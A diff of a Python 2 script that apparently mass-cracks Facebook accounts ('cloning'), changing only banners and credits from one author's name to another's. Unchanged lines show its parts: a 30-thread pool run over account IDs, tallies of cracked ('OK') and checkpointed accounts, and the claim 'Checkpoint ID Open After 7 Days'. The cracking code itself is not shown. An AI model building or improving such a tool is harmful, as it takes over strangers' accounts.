@@ -54,8 +54,8 @@ logo = """
 \033[1;94m    \ \_\  \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
 \033[1;93m     \/_/   \/_/   \/_____/   \/_____/   \/_/ /_/ 
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.𝕽𝖆𝖓𝖆 𝕬𝖆𝖍𝖎𝖑               ║    
-\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ AHS            ║  
+\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝓐𝓫𝓮𝓭 𝓗𝓸𝓼𝓼𝓪𝓲𝓷 𝓢𝓱𝓪𝓭𝓲𝓷           ║    
+\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊       AHS      ║  
 \033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
 def tik():
@@ -87,7 +87,7 @@ print  """
 """
 jalan("\033[1;92m              _    _     _ ")             
 jalan("\033[1;92m             | |  (_)   | |")             
-jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD✔ ") 
+jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  HACK✔ ") 
 jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")
 jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")
 jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")
@@ -165,7 +165,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -295,7 +295,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91mAahil start cloning Wait...')
+	jalan('           \033[1;91mAbed start cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -514,8 +514,8 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackTiger\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»" #Dev:Rana
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Tiger.py)↩\033[1;97m....'
+	print "  \033[1;91m«---•◈•---Developed By 𝓐𝓫𝓮𝓭 𝓗𝓸𝓼𝓼𝓪𝓲𝓷 𝓢𝓱𝓪𝓭𝓲𝓷--•◈•---»" #Dev:Abed
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 abed.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
@@ -538,10 +538,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....Aahil Creations....... \033[1;95m :
+: \033[1;91m ....𝓐𝓫𝓮𝓭 𝓗𝓸𝓼𝓼𝓪𝓲𝓷 𝓢𝓱𝓪𝓭𝓲𝓷....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;91m Aahil"""
+              \033[1;91m 𝓐𝓫𝓮𝓭 𝓗𝓸𝓼𝓼𝓪𝓲𝓷 𝓢𝓱𝓪𝓭𝓲𝓷"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
